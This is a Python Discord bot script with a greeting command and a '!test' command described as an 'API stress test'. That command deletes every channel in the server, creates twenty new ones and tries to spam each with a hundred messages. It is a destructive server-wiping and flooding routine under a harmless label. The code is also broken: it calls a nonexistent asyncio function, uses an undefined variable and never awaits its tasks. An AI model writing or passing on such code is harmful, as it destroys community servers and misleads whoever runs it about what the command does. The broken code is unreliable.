import discord
import asyncio
from discord.ext import commands

#Configures bot intents
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.messages = True
intents.message_content = True

#Command instance to use commands
bot = commands.Bot(command_prefix='!', intents=intents)

#Bot's authentication token (KEEP SECRET)
token = "TOKEN_GOES_HERE"

# -------------------------------------------------
# Event triggered when the bot successfully connects
# -------------------------------------------------
@bot.event
async def on_ready():
    print(f'''Bot is online, Login as {bot.user.name}, Version 1.0''')

# -------------------------------------------------
# Simple test command to verify the bot is working
# Usage: !hello
# -------------------------------------------------
@bot.command(name='hello')
async def greet(ctx):
    await ctx.send('Hello world!')

#Sends multiple messages simultaneously
async def massmessages(channel, nummessages):
  for _ in range(nummessages):
      await channel.send("Testing!")

# -------------------------------------------------
# API stress test command
# Usage: !test
# -------------------------------------------------
@bot.command(name='test')
#Deletes pre-existing channels, creates new ones
async def deleteandcreate(ctx):
  # Delete all existing channels
  guild = ctx.guild
  for channel in guild.channels:
      await channel.delete()

  # Create multiple text channels concurrently
  newchannels = await asyncio.gather(*[guild.create_text_channel(name=f"test channel{i}") for i in range(20)])
  # Create async tasks to send messages in each channel
  tasks = []
  for newchannel in newchannels:
      tasks.append(asyncio.createtask(massmessages(new_channel, 100)))

#Enables the bot to run for the session
bot.run(token)
